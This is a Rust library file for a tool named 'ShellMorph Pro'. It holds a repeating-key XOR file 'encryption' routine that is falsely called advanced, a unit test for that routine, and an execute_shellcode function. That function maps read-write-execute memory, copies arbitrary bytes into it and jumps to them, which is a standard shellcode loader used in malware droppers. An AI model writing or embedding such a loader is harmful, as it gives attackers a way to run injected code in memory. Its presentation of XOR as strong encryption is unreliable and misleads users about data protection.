// lib.rs - Core logic for ShellMorph Pro

#![deny(warnings, clippy::all, clippy::pedantic)]
#![allow(clippy::module_name_repetitions)]

use std::fs;
use std::io::{self, Read, Write};
use std::path::Path;

/// Encrypts a given file using XOR-based encryption.
/// Advanced and optimized for large files.
pub fn encrypt_file(input_path: &Path, output_path: &Path, key: &[u8]) -> io::Result<()> {
    let mut input_file = fs::File::open(input_path)?;
    let mut output_file = fs::File::create(output_path)?;

    let mut buffer = vec![0; 8192]; // Efficient chunk size
    let key_len = key.len();
    let mut key_index = 0;

    loop {
        let bytes_read = input_file.read(&mut buffer)?;
        if bytes_read == 0 {
            break;
        }
        for byte in &mut buffer[..bytes_read] {
            *byte ^= key[key_index];
            key_index = (key_index + 1) % key_len;
        }
        output_file.write_all(&buffer[..bytes_read])?;
    }

    Ok(())
}

/// Loads and executes shellcode dynamically.
pub fn execute_shellcode(shellcode: &[u8]) -> Result<(), String> {
    use std::ptr;
    use libc::{mmap, mprotect, PROT_EXEC, PROT_READ, PROT_WRITE, MAP_ANONYMOUS, MAP_PRIVATE};

    let mem_size = shellcode.len();
    unsafe {
        let mem = mmap(
            ptr::null_mut(),
            mem_size,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0,
        );

        if mem == libc::MAP_FAILED {
            return Err("Memory allocation failed".to_string());
        }

        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, mem_size);
        let shellcode_fn: extern "C" fn() = std::mem::transmute(mem);
        shellcode_fn();
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_file() {
        let input = b"Test data for encryption";
        let key = b"key";
        let encrypted = input.iter().zip(key.iter().cycle()).map(|(a, b)| a ^ b).collect::<Vec<_>>();

        let temp_input = "test_input.txt";
        let temp_output = "test_output.txt";

        fs::write(temp_input, input).unwrap();
        encrypt_file(Path::new(temp_input), Path::new(temp_output), key).unwrap();
        let output = fs::read(temp_output).unwrap();

        assert_eq!(output, encrypted);
        fs::remove_file(temp_input).unwrap();
        fs::remove_file(temp_output).unwrap();
    }
}
